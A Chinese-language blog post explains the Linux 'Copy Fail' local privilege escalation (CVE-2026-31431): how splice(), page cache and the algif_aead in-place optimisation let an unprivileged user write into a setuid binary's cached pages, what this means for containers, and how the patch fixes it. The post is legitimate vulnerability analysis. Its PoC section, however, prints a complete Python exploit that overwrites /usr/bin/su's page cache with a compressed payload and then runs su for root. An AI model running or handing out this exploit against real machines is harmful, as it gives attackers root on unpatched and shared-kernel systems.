---
title: "Copy Fail 小記：從少一次 memory copy 到 root"
date: "2026-10-28"
description: "從 splice、page cache 與 algif_aead 的 in-place 設計，理解 Copy Fail 如何讓一般使用者取得 root，以及後來的修補方式。"
tags:
  - linux
  - security
  - performance
permalink: "/2026/10/28/copy-fail-note/"
---

## Preface

最近回頭看 4 月的 Linux 的 Copy Fail（CVE-2026-31431），研究團隊展示了一個只有 732 bytes 的 Python script，就能在幾個主流 Linux distribution 上面拿到 root，覺得蠻酷的，就稍微看了一下背後的實作。

先說一下，這是 local privilege escalation，也就是攻擊者原本就需要能在機器上執行程式，再從一般 user 提權成 root，而實際上能不能利用，還是要看 kernel 是否包含漏洞、相關功能有沒有開啟，以及有沒有套用 patch。

不過讓我比較有興趣的是，為什麼一個 user 明明沒有權限修改系統檔案，卻可以透過 kernel 的加密功能，改到系統執行的內容？

## Page cache 與 splice()

這邊需要先看 page cache 和 splice()。

Linux 讀取檔案的時候，會把檔案內容放在 page cache 裡面，後面其他 process 要讀取或執行同一個檔案，就可以使用記憶體裡面的資料，減少 disk access。

而 splice() 可以在 file descriptor 和 pipe 之間傳遞資料，部分路徑不需要真的把內容 copy 一份，只要傳遞指向原本 memory page 的 reference 就好。從 performance 的角度來看，少一次 memory copy 當然是好事，但也代表後面的程式拿到的，可能還是原本那份檔案的 page cache。

接下來是 kernel 的加密介面。Linux 提供 AF_ALG socket，讓 userspace program 可以使用 kernel 實作的加密功能，其中 algif_aead 負責 AEAD，也就是同時包含加解密與資料驗證的介面。

在這次的利用路徑裡，檔案頁面的參照會經過兩次 splice()：

```text
檔案的 page cache
        │
        │ splice(file → pipe)
        ▼
       Pipe
        │
        │ splice(pipe → socket)
        ▼
AF_ALG 操作 socket 的輸入 scatterlist
```

scatterlist 可以先理解成一份清單，記錄資料分散在哪些 memory page，讓 kernel 不需要先把資料全部整理到一塊連續的記憶體，才能交給後面的演算法處理。

這兩次傳遞本身還沒有造成錯誤寫入，但加密流程已經可以透過這些 reference，接觸到原本的檔案快取。

## In-place optimization

這次的問題出在，2017 年 algif_aead 加入了一個 in-place optimization，讓加密操作的輸入和輸出共用部分記憶體結構。在這條路徑下，原本由 splice() 帶進來的檔案 page cache，有一部分被接到了可寫的 output scatterlist 上面。

而 authencesn 這個加密驗證實作，會把 destination 的部分位置拿來當 scratch space，寫入暫存資料。兩件事情接在一起，這個暫存寫入就碰到了原本檔案的 page cache。

更有趣的是，即使最後驗證失敗，操作回傳 error，前面寫進去的 4 bytes 也不會因此消失。

這裡並沒有透過一般的檔案寫入操作。使用者沒有拿到 write permission，卻讓 kernel 在處理加密資料的過程中，替自己改到了原本不能修改的內容。

研究團隊展示的方式，是修改高權限執行檔的 page cache，再執行被改過的版本，進而取得 root。磁碟上的檔案可以沒有改變，但 kernel 執行時讀到的，已經是記憶體裡被修改的內容。[1]

## 一小段 Python PoC

下面是這次討論的短版 PoC，目標是 `/usr/bin/su`。可以看到兩次 `os.splice()`，分別把檔案頁面送進 pipe，再從 pipe 交給 AF_ALG 的操作 socket，最後透過接收操作觸發加密流程。

這段會實際修改執行檔的 page cache 並嘗試提權，僅適合在自己有權限的隔離測試環境研究，不要直接貼到 production 上面執行。這裡保留原本的短寫法，只整理縮排，未在本文環境執行驗證。

```python
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
    try:u.recv(8+t)
    except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

這裡的 `recv()` 即使回傳錯誤，也不能代表什麼事情都沒發生，因為錯誤回報之前，page cache 就已經被寫入了。

## VPS 與 container 的影響

看到這邊，自然就會想到 VPS 和 container。

如果是 KVM 這類完整 VM，每台 VM 有自己的 kernel，在 VM 裡面取得 root，還不代表能控制外面的 host，畢竟客戶通常本來就有自己 VM 的 root。

但 container 型的 VPS，或是共享的 CI runner、線上開發環境，就比較需要注意。這些服務本來就允許使用者執行程式，而不同使用者的 workload 又可能共用同一個 kernel。當漏洞涉及共享檔案的 page cache，影響就有機會超出原本的 container，實際能走多遠則取決於檔案共享方式與隔離設定。

對這類服務來說，「攻擊者需要先能執行程式」這個前提，其實是平台原本就提供的功能。

## Patch 與心得

後來的 patch 也蠻值得看，主要是修改 algif_aead，把 in-place operation 改回 out-of-place，讓 input 和 output 分開，不再把那些檔案頁面接進可寫的 output list。補丁作者甚至提到，這裡的 source 和 destination 本來就來自不同 mapping，採用 in-place 並沒有好處，乾脆把相關的複雜度移除。[2]

我覺得這個案例有趣的地方是，一個省 copy 的路徑，加上一個共用 buffer 的 optimization，再接上一個拿 destination 當暫存空間的實作，最後讓原本只能讀取的檔案內容變成可以被修改。

平常看 performance optimization，常常會注意少了幾次 allocation、memory copy，或是 cache utilization 有沒有改善。但當資料開始透過 reference 在不同 subsystem 之間傳遞，誰擁有這塊記憶體、誰可以寫入，其實也需要一起考慮。

對有在維護 Linux server 的人，還是先確認 kernel 已經更新，並且目前跑的確實是包含修補的版本。

## References

1. [Copy Fail 技術分析](https://xint.io/blog/copy-fail-linux-distributions)
2. [Linux patch：Revert to operating out-of-place](https://github.com/torvalds/linux/commit/a664bf3d603d)
3. [研究團隊公開的 PoC repository](https://github.com/theori-io/copy-fail-CVE-2026-31431)
